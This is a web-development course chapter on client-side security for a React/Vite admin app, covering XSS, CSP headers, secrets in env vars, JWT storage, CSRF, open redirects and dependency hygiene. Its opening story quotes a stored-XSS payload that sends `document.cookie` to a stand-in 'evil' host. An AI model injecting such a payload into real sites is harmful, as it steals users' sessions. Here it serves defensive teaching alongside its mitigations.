# 35. Client-side security: XSS, CSP, secrets

## A story from work

A security review of the admin SPA before production: a pentester shows a PoC — a product's `description` field stores `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>`. If the UI renders HTML unsanitized — XSS. Separately: a junior dev committed `VITE_STRIPE_SECRET=sk_live_...` — a secret in the client bundle forever.

React reduces some risks (JSX escapes strings), but it **doesn't cancel out** auth mistakes, XSS via `dangerouslySetInnerHTML`, token storage, or the dependency supply chain.

## What you'll learn

- XSS vectors in React admin apps
- CSP headers and what they give a SPA
- Why secrets never belong in `VITE_*`
- JWT on the client: threat model ([09-token-storage.md](09-token-storage.md))
- CSRF — when it's relevant for a SPA
- Dependency hygiene

---

## XSS in React — the threat model

| Vector | Risk |
|--------|------|
| `{userInput}` in JSX | **Low** — escaped by default |
| `dangerouslySetInnerHTML` | **High** — only sanitized HTML |
| `href={userUrl}` `javascript:` | **High** — validate the URL scheme |
| Third-party widgets | **Medium** — supply chain |
| Stored XSS via API → UI | **High** if you render HTML |

**Admin catalog:** `title`, `description` from Django — treat them as **untrusted** unless the backend sanitizes.

```tsx
// Safe — text content
<p>{product.description}</p>

// Dangerous
<div dangerouslySetInnerHTML={{ __html: product.description }} />

// If rich text is required — DOMPurify
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(product.description),
}} />
```

Default policy: **plain text only** in admin tables and detail views.

---

## Content Security Policy (CSP)

CSP — an HTTP header that restricts the sources of scripts/styles/connect.

Example for a Vite SPA behind nginx:

```nginx
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' http://localhost:8092;
  frame-ancestors 'none';
  base-uri 'self';
" always;
```

| Directive | Why for a SPA |
|-----------|-----------|
| `script-src 'self'` | blocks inline injected scripts |
| `connect-src` | whitelist the API `:8092` |
| `frame-ancestors 'none'` | clickjacking |
| `'unsafe-inline'` style | often needed by Vite dev; tighten in prod |

**Nonce-based CSP** — advanced; for an internal admin, a strict `script-src 'self'` is often enough.

Report violations: `report-uri /csp-report` — optional monitoring.

---

## Secrets and environment variables

Vite exposes **`VITE_*`** to the client bundle — **public forever**.

```env
# OK — public API URL
VITE_API_URL=https://api.shop.example

# NEVER — visible in the built JS
VITE_JWT_SECRET=...
VITE_DATABASE_URL=...
```

Secrets live **server-side only**: Django, BFF, CI secrets. The client receives a **short-lived access token** after login, not master keys.

Check before release:

```bash
npm run build
grep -r "sk_live" dist/ || true
```

---

## JWT threat model (brief)

| Storage | XSS impact | CSRF |
|---------|------------|------|
| memory | token lost when the tab refreshes | low for a Bearer header |
| localStorage | stolen via XSS | low |
| httpOnly cookie | not readable by JS | needs SameSite + CSRF token |

The mock-exams course: Bearer in memory + refresh flow ([12-refresh-flow.md](12-refresh-flow.md)). **XSS mitigation** matters more than the choice of storage — CSP, sanitize, no innerHTML.

Logout on idle, short access TTL, refresh rotation — server concerns; the client cooperates.

---

## CSRF and the SPA

**Bearer token in the Authorization header** (not a cookie) — CSRF is **not classic** (the browser doesn't send the header cross-site automatically).

A **cookie-based session** for the API needs:

- `SameSite=Lax/Strict`
- a CSRF token double-submit or a custom header
- strict CORS

A Django admin API with session cookies — read the django-cors + CSRF docs; a JWT Bearer SPA is simpler from a CSRF standpoint.

---

## Authorization vs authentication

Client-side `role === 'admin'` for **hiding UI** — OK. **Security enforcement** — server only (DRF permissions). Never rely on hiding a Delete button in React.

```tsx
// UX only
{user.role === "admin" && <DeleteButton />}

// Server returns 403 if forbidden — handle gracefully
```

---

## Open redirects

```tsx
// Dangerous after login
const next = searchParams.get("next");
navigate(next); // ?next=https://evil.com

// Safe
const safe =
  next?.startsWith("/") && !next.startsWith("//") ? next : "/products";
navigate(safe);
```

---

## Dependency supply chain

```bash
npm audit
```

- Lockfile committed (`package-lock.json`)
- Renovate/Dependabot
- Review new deps (especially `postinstall` scripts)

MSW, RHF — reputable; a random `react-admin-theme` from an unknown author — a risk.

---

## Error messages and information leakage

Don't show stack traces to users in prod. Log client-side to monitoring (Sentry) with PII scrubbing.

```tsx
// User sees
toast.error("Failed to save the product");

// Dev only
if (import.meta.env.DEV) console.error(error);
```

---

## Lab (short version)

1. Audit the codebase: `dangerouslySetInnerHTML`, `VITE_` env, `eval`, `target="_blank"` without `rel="noopener"`.
2. Document `.env.example` — only public vars.
3. (Optional) nginx CSP header for `npm run preview`.

**Success criterion:** no secrets in the repo; product description rendered as text.

---

## Common mistakes

1. **`VITE_` for private keys** — leaked in the bundle.

2. **Trust API HTML** in admin without sanitizing.

3. **JWT in localStorage + XSS** — game over; fix XSS first.

4. **Client-only role checks** — security theater.

5. **`target="_blank"` without `rel="noopener noreferrer"`** — tabnabbing.

6. **Mixed content** — HTTPS SPA → HTTP `:8092` blocked.

---

## Checklist

- [ ] User/API content rendered as text, not raw HTML
- [ ] No secrets in `VITE_*` or git
- [ ] CSP planned for production nginx
- [ ] Open redirect guarded on the login return URL
- [ ] 403 from the API handled; permissions enforced server-side
- [ ] `npm audit` clean or documented exceptions
- [ ] Prod errors don't leak the stack to users

---

[← 34-accessibility](34-accessibility.md) · [36-production-build →](36-production-build.md)
